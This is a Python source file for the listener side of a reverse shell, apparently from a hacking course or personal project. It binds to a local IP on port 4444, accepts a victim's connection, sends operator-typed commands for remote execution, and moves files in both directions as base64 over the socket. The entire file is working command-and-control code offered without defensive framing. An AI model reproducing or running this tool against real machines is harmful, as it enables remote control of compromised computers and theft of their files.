import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a Connection" + str(address))

    def reliable_send(self, data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))
    

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                continue

    def execute_remotely(self,command):

        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
            
        return self.reliable_receive()


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode('utf-8')  # Convert bytes to string

    def write_file(self, path, content):
        content_bytes = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(content_bytes)
            return "[+] Download successful."

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ",1)

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)

my_listener = Listener("192.168.7.116", 4444)
my_listener.run()
